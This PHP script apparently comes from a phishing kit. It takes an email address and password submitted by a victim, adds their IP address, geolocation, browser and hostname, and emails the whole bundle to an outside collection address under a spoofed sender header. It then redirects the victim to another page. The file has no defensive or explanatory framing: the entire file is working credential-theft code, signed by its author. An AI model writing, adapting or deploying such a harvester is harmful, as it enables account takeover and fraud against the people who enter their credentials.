<?php
require("xxxxbt.php");
require("ip.php");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email ID:             : ".$_POST['piot']."\n";
$mind = $_POST['piot'];
$message .= "Password:             : ".$_POST['iot']."\n";
$message .= "-------------Data-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Dirty Sexy Money-------------\n";
$send = "info@resultzbox.online";
$subject = "$ip";
$headers = "From: Email Contact <customer-support@bin-ramaphosa.org>";
$headers .= $_POST['lactoese']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
	  header("Location: ampt.html?app=$mind&=d&source=product.landing_search&locale=en_US&question_box=404");

	 
?>
